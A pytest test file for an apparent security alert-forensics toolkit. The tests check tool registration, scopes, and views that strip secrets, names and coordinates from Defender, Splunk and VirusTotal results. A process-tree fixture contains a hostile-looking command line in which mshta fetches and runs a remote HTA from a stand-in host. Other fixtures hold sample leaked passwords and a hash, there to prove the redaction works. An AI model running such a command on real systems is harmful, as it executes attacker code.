import json

import pytest
from pydantic import JsonValue, ValidationError

from alert_forensics.contracts import SourceSystem
from alert_forensics.tools import DEFINITIONS, TOOL_NAMES, ToolDefinition
from conftest import FIXTURE_TOOLS_DIR

EXPECTED = {
    "search_events": (SourceSystem.defender, "hunting:read", "fixture"),
    "search_siem": (SourceSystem.splunk, "siem:search", "fixture"),
    "get_identity": (SourceSystem.splunk, "identity:read", "fixture"),
    "get_asset": (SourceSystem.splunk, "asset:read", "fixture"),
    "lookup_ioc": (SourceSystem.virustotal, "ioc:lookup", "live"),
    "get_related_alerts": (SourceSystem.graph_security, "alerts:read", "fixture"),
    "get_process_tree": (SourceSystem.defender, "hunting:read", "fixture"),
    "search_runbook": (SourceSystem.runbook, "runbook:read", "fixture"),
    "get_attack_technique": (SourceSystem.attack, "attack:read", "live"),
    "propose_alert_disposition": (SourceSystem.human, "alerts:write", "local"),
}
FIXTURE_BACKED = sorted(n for n in EXPECTED if n != "propose_alert_disposition")


def first_stub_response(name: str):
    data = json.loads((FIXTURE_TOOLS_DIR / f"{name}.json").read_text())
    return next(s["response"] for s in data["stubs"] if "response" in s)


def first_stub_arguments(name: str):
    """The first stub's match as a request: an exact value as it is, an operator
    matcher as a placeholder of the field's type."""
    data = json.loads((FIXTURE_TOOLS_DIR / f"{name}.json").read_text())
    match = next(s["match"] for s in data["stubs"] if "response" in s)
    fields = DEFINITIONS[name].request_model.model_fields
    return {
        k: (v if not isinstance(v, dict) else (1 if fields[k].annotation is int else "x"))
        for k, v in match.items()
    }


def test_the_ten_tools_are_registered_once_each():
    assert list(DEFINITIONS) == TOOL_NAMES
    assert set(TOOL_NAMES) == set(EXPECTED)
    assert len(TOOL_NAMES) == 10
    assert TOOL_NAMES[-1] == "propose_alert_disposition"
    for name, definition in DEFINITIONS.items():
        assert isinstance(definition, ToolDefinition)
        assert definition.name == name


@pytest.mark.parametrize("name", sorted(EXPECTED))
def test_each_tool_declares_system_scope_and_live_status(name):
    system, scope, status = EXPECTED[name]
    definition = DEFINITIONS[name]
    assert definition.source_system is system
    assert definition.required_scope == scope
    assert definition.live.status == status
    assert definition.live.system and definition.live.endpoint and definition.live.permission
    assert definition.description.strip()


def test_exactly_two_tools_are_live_capable():
    live = sorted(n for n, d in DEFINITIONS.items() if d.live_capable)
    assert live == ["get_attack_technique", "lookup_ioc"]


@pytest.mark.parametrize("name", FIXTURE_BACKED)
def test_response_shape_accepts_its_fixture_and_projects_to_a_view(name):
    definition = DEFINITIONS[name]
    raw = first_stub_response(name)
    request = definition.request_model.model_validate(first_stub_arguments(name))
    response = definition.response_model.model_validate(raw)
    view = definition.project(response, request)
    assert isinstance(view, definition.view_model)
    dumped = view.model_dump(mode="json")
    json.dumps(dumped)  # the view is plain JSON


@pytest.mark.parametrize("name", FIXTURE_BACKED)
def test_response_shapes_tolerate_unknown_fields_and_views_forbid_them(name):
    definition = DEFINITIONS[name]
    raw = first_stub_response(name)
    raw_with_extra = {**raw, "someFutureField": {"x": 1}}
    definition.response_model.model_validate(raw_with_extra)
    request = definition.request_model.model_validate(first_stub_arguments(name))
    view = definition.project(definition.response_model.model_validate(raw), request)
    with pytest.raises(ValidationError):
        definition.view_model.model_validate({**view.model_dump(), "leak": "value"})


@pytest.mark.parametrize("name", FIXTURE_BACKED)
def test_request_model_rejects_unknown_arguments(name):
    definition = DEFINITIONS[name]
    with pytest.raises(ValidationError):
        definition.request_model.model_validate({**first_stub_arguments(name), "bogus": 1})


def test_coordinates_are_not_on_the_hunting_allowlist_but_city_and_country_are():
    from alert_forensics.tools.definitions._columns import hunting_column_allowed

    assert not hunting_column_allowed("Latitude")
    assert not hunting_column_allowed("Longitude")
    assert hunting_column_allowed("City")
    assert hunting_column_allowed("Country")
    definition = DEFINITIONS["search_events"]
    response = definition.response_model.model_validate(
        {
            "schema": [
                {"name": n} for n in ("Timestamp", "City", "Country", "Latitude", "Longitude")
            ],
            "results": [
                {
                    "Timestamp": "2026-09-14T09:58:11Z",
                    "City": "Paris",
                    "Country": "FR",
                    "Latitude": 48.8566,
                    "Longitude": 2.3522,
                }
            ],
        }
    )
    view = definition.project(response)
    assert view.columns == ["Timestamp", "City", "Country"]
    assert view.rows == [{"Timestamp": "2026-09-14T09:58:11Z", "City": "Paris", "Country": "FR"}]
    assert view.dropped_columns == 2
    assert "48.8566" not in json.dumps(view.model_dump(mode="json"))


def test_the_proposal_tool_writes_nothing_and_says_so():
    definition = DEFINITIONS["propose_alert_disposition"]
    request = definition.request_model.model_validate(
        {
            "verdict": "false_positive",
            "recommended_action": "Close; add the gateway range to the travel allowlist.",
            "escalate": False,
            "summary": "Both sign-ins come from the group SASE gateway.",
        }
    )
    with pytest.raises(ValidationError):
        definition.request_model.model_validate({"verdict": "closed", "recommended_action": "x"})
    raw = {
        "status": "proposed",
        "verdict": "false_positive",
        "recommended_action": request.recommended_action,
        "escalate": False,
        "summary": request.summary,
        "proposed_at": "2026-09-14T10:00:00Z",
    }
    view = definition.project(definition.response_model.model_validate(raw), request)
    dumped = view.model_dump(mode="json")
    assert dumped["status"] == "proposed"
    assert dumped["verdict"] == "false_positive"
    assert "nothing was written" in dumped["note"].lower()
    assert definition.live.status == "local"
    assert not definition.live_capable


def test_hunting_projection_caps_rows_and_reports_the_total():
    definition = DEFINITIONS["search_events"]
    rows = [{"ReportId": i} for i in range(75)]
    response = definition.response_model.model_validate(
        {"schema": [{"name": "ReportId", "type": "Int64"}], "results": rows}
    )
    view = definition.project(response)
    assert view.row_count == 75
    assert len(view.rows) == 50
    assert view.truncated is True
    assert view.columns == ["ReportId"]
    assert view.dropped_columns == 0


def test_ioc_projection_reads_the_counters_and_the_reputation():
    definition = DEFINITIONS["lookup_ioc"]
    view = definition.project(
        definition.response_model.model_validate(first_stub_response("lookup_ioc"))
    )
    assert view.known is True
    assert view.indicator_type == "ip_address"
    assert view.detection_ratio == "0/94"
    assert view.engines is not None
    assert (view.engines.malicious, view.engines.verdicts, view.engines.not_analysed) == (0, 94, 0)
    assert view.reputation is not None
    assert view.reputation.score == 0
    assert "not clean" in view.reputation.reading
    assert view.last_analysis_at == "2026-09-13T11:46:40Z"
    assert view.context["as_owner"] == "EXAMPLE-SASE-NET"
    assert view.context["country"] == "NL"
    dumped = view.model_dump(mode="json")
    assert "last_analysis_results" not in json.dumps(dumped)
    assert "whois" not in dumped["context"]


def test_ioc_projection_treats_not_found_as_a_reading():
    definition = DEFINITIONS["lookup_ioc"]
    response = definition.response_model.model_validate(
        {"error": {"code": "NotFoundError", "message": 'Domain "x.example" not found'}}
    )
    view = definition.project(response)
    assert view.known is False
    assert view.engines is None and view.reputation is None
    assert view.detection_ratio is None
    assert "no record" in view.note.lower()


def test_identity_projection_drops_names_phones_and_coordinates():
    definition = DEFINITIONS["get_identity"]
    view = definition.project(
        definition.response_model.model_validate(first_stub_response("get_identity"))
    )
    assert view.found is True
    assert view.identities == ["jdoe", "jdoe@contoso.com", "CONTOSO\\jdoe"]
    assert view.email == "jdoe@contoso.com"
    assert view.priority == "medium"
    assert view.categories == ["employee", "trader"]
    assert view.watchlist is False
    assert view.business_unit == "Equities Trading"
    text = json.dumps(view.model_dump(mode="json"))
    for leaked in ("Jane", "Doe", "+33", "48.8566", "2.3522"):
        assert leaked not in text


def test_asset_projection_reads_compliance_flags():
    definition = DEFINITIONS["get_asset"]
    view = definition.project(
        definition.response_model.model_validate(first_stub_response("get_asset"))
    )
    assert view.found is True
    assert view.nt_host == "SRV-PRD-APP01"
    assert view.priority == "critical"
    assert view.categories == ["server", "production", "pci"]
    assert (view.is_expected, view.should_update, view.requires_av) == (True, True, True)
    assert view.pci_domain == "cardholder"
    assert "lat" not in view.model_dump()


def test_identity_projection_reports_absence():
    definition = DEFINITIONS["get_identity"]
    view = definition.project(definition.response_model.model_validate({"sid": "1", "results": []}))
    assert view.found is False
    assert view.identities == [] and view.email is None


def test_process_tree_projection_reconstructs_the_lineage():
    definition = DEFINITIONS["get_process_tree"]
    raw = first_stub_response("get_process_tree")
    request = definition.request_model.model_validate(
        {"device_name": "ws-fin-0042", "process_id": 4412}
    )
    view = definition.project(definition.response_model.model_validate(raw), request)
    assert view.found is True
    assert [(n.relation, n.file_name, n.process_id) for n in view.lineage] == [
        ("grandparent", "explorer.exe", 2044),
        ("parent", "outlook.exe", 3120),
        ("self", "mshta.exe", 4412),
        ("child", "powershell.exe", 4480),
        ("child", "RemoteSupport.ClientSetup.exe", 4530),
    ]
    me = view.lineage[2]
    assert me.command_line == "mshta.exe https://relay.example.net/invoice.hta"
    assert me.account == "pnovak"
    assert me.created_at == "2026-09-14T08:41:10.000Z"


def test_process_tree_projection_reports_absence():
    definition = DEFINITIONS["get_process_tree"]
    request = definition.request_model.model_validate({"device_name": "x", "process_id": 1})
    view = definition.project(
        definition.response_model.model_validate({"schema": [], "results": []}), request
    )
    assert view.found is False and view.lineage == []


def test_related_alerts_projection_summarises_each_alert():
    definition = DEFINITIONS["get_related_alerts"]
    view = definition.project(
        definition.response_model.model_validate(first_stub_response("get_related_alerts"))
    )
    assert view.count == 1 and not view.truncated
    only = view.alerts[0]
    assert only.title == "Unfamiliar sign-in properties"
    assert only.classification == "falsePositive"
    assert only.mitre_techniques == ["T1078.004"]
    assert only.created_date_time == "2026-09-01T07:12:00Z"


def test_related_alerts_request_needs_at_least_one_pivot():
    definition = DEFINITIONS["get_related_alerts"]
    with pytest.raises(ValidationError):
        definition.request_model.model_validate({})
    definition.request_model.model_validate({"incident_id": "41"})


def test_attack_projection_strips_citations_and_names_the_tactic():
    definition = DEFINITIONS["get_attack_technique"]
    view = definition.project(
        definition.response_model.model_validate(first_stub_response("get_attack_technique"))
    )
    assert view.technique_id == "T1110.003"
    assert view.name == "Password Spraying"
    assert view.tactics == ["credential-access"]
    assert view.is_subtechnique is True
    assert "(Citation:" not in view.description
    assert view.description.endswith("credentials.")
    assert view.url == "https://attack.mitre.org/techniques/T1110/003"
    assert view.revoked is False and view.superseded_by is None


def test_attack_request_validates_the_id_shape():
    definition = DEFINITIONS["get_attack_technique"]
    for bad in ("1110", "T11", "t1110.003", "T1110.3"):
        with pytest.raises(ValidationError):
            definition.request_model.model_validate({"technique_id": bad})
    definition.request_model.model_validate({"technique_id": "T1110"})
    definition.request_model.model_validate({"technique_id": "T1110.003"})


def test_runbook_projection_passes_hits_through():
    definition = DEFINITIONS["search_runbook"]
    view = definition.project(
        definition.response_model.model_validate(first_stub_response("search_runbook"))
    )
    assert view.count == 2
    assert view.hits[0].id == "RB-0114"
    assert view.hits[0].score == pytest.approx(0.91)


def test_siem_projection_keeps_sid_fields_and_messages():
    definition = DEFINITIONS["search_siem"]
    view = definition.project(
        definition.response_model.model_validate(first_stub_response("search_siem"))
    )
    assert view.sid == "1789300000.12345"
    assert view.fields == ["_time", "user", "src", "action", "count"]
    assert view.row_count == 2 and not view.truncated
    assert view.messages == ["Your timerange was substituted based on your search string"]


DEFENDER_ROW = {
    "Timestamp": "2026-09-14T08:00:00.000Z",
    "DeviceName": "srv-prd-app01.contoso.com",
    "ActionType": "ServiceInstalled",
    "AccountName": "svc-cfgmgmt",
    "AccountDisplayName": "Configuration Management (svc)",
    "ReportId": 8812,
    "AdditionalFields": (
        '{"ServiceName":"cfgmgmt-agent","ServiceAccountPwd":"S3cret!Svc","StartType":"Auto",'
        '"NtlmHash":"aad3b435b51404eeaad3b435b51404ee"}'
    ),
}


def test_hunting_view_keeps_only_allowlisted_columns():
    definition = DEFINITIONS["search_events"]
    response = definition.response_model.model_validate(
        {"schema": [{"name": k, "type": "String"} for k in DEFENDER_ROW], "results": [DEFENDER_ROW]}
    )
    view = definition.project(response)
    text = json.dumps(view.model_dump(mode="json"))
    assert "AdditionalFields" not in text
    assert "S3cret!Svc" not in text and "aad3b435" not in text
    assert "Configuration Management" not in text
    assert set(view.rows[0]) == {"Timestamp", "DeviceName", "ActionType", "AccountName", "ReportId"}
    assert view.columns == ["Timestamp", "DeviceName", "ActionType", "AccountName", "ReportId"]
    assert view.dropped_columns == 2


def test_hunting_view_allows_kql_aggregates_of_allowed_columns_only():
    definition = DEFINITIONS["search_events"]
    row = {
        "AccountUpn": "jdoe@contoso.com",
        "count_": 3,
        "dcount_IPAddress": 2,
        "make_set_Location": ["Paris, FR", "Amsterdam, NL"],
        "dcount_AdditionalFields": 1,
        "any_AdditionalFields": '{"x":1}',
    }
    view = definition.project(
        definition.response_model.model_validate({"schema": [], "results": [row]})
    )
    assert set(view.rows[0]) == {"AccountUpn", "count_", "dcount_IPAddress", "make_set_Location"}
    assert view.dropped_columns == 2


def test_siem_view_keeps_only_allowlisted_fields():
    definition = DEFINITIONS["search_siem"]
    row = {
        "_time": "2026-09-14T09:12:04.000+00:00",
        "user": "jdoe",
        "src": "203.0.113.7",
        "count": "2",
        "dc(src)": "1",
        "values(_raw)": "Sep 14 09:12:04 gw sshd: Accepted password hunter2 for jdoe",
        "_raw": "Sep 14 09:12:04 gw sshd: Accepted password hunter2 for jdoe",
        "first": "Jane",
    }
    view = definition.project(
        definition.response_model.model_validate(
            {"sid": "1", "fields": [{"name": k} for k in row], "results": [row]}
        )
    )
    assert set(view.rows[0]) == {"_time", "user", "src", "count", "dc(src)"}
    assert view.fields == ["_time", "user", "src", "count", "dc(src)"]
    assert view.dropped_columns == 3
    assert "hunter2" not in json.dumps(view.model_dump(mode="json"))


def test_process_tree_nodes_never_carry_a_row_column():
    definition = DEFINITIONS["get_process_tree"]
    raw = first_stub_response("get_process_tree")
    rows = [{**r, "AdditionalFields": DEFENDER_ROW["AdditionalFields"]} for r in raw["results"]]
    request = definition.request_model.model_validate(
        {"device_name": "ws-fin-0042", "process_id": 4412}
    )
    view = definition.project(
        definition.response_model.model_validate({"schema": [], "results": rows}), request
    )
    text = json.dumps(view.model_dump(mode="json"))
    assert "AdditionalFields" not in text and "S3cret!Svc" not in text
    assert set(view.lineage[2].model_dump()) == {
        "relation",
        "file_name",
        "folder_path",
        "command_line",
        "process_id",
        "created_at",
        "account",
        "sha256",
    }


def test_tabular_rows_are_json_values():
    from alert_forensics.tools.definitions.search_siem import SiemView

    assert SiemView.model_fields["rows"].annotation == list[dict[str, JsonValue]]
    assert (
        DEFINITIONS["search_events"].view_model.model_fields["rows"].annotation
        == (list[dict[str, JsonValue]])
    )
